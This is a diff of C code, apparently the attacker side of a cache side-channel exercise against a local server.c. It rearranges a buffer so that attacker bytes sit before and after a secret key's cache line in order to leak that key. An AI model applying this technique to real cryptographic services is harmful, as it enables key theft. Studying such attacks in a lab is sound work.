@@ -136,16 +136,23 @@ unsigned cache_line_size(){
   return *size;
 }
 
-void send_buffer(char *to_send, int keysize){
+void send_buffer(char *to_send, int keysize, int position){
   unsigned char buffer[BUFFERSIZE];
 
   memset(buffer, 1, BUFFERSIZE);
   buffer[0] = CIPHER;
 
   // Knowing that there are 2 lines of separation between attacker space and secret cache line
-  memcpy(&buffer[129], to_send, LINESIZE-keysize);
+  //
+  // And that is because of the encrypt function on the server.c file!
+  
+  // Write before the secret...
+  memcpy(&buffer[129], to_send, LINESIZE-keysize+position);
+  // ...and after the secret.
+  memcpy(&buffer[129+LINESIZE-keysize+position], to_send, keysize-position);
 
   bzero(&buffer[LINESIZE*3+1-keysize], 8); // Point to stop
+  // I think no need to change, it is 3 cache lines down.
 
   int _r = write(data_socket, buffer, BUFFERSIZE);
 }
@@ -161,7 +168,7 @@ void accessKey(){
 
 void ciph(){
   unsigned char buffer[BUFFERSIZE];
-  bzero(buffer, BUFFERSIZE);  
+  bzero(buffer, BUFFERSIZE);
   buffer[0] = CIPHER;
   int _r = write(data_socket, buffer, BUFFERSIZE);
 }
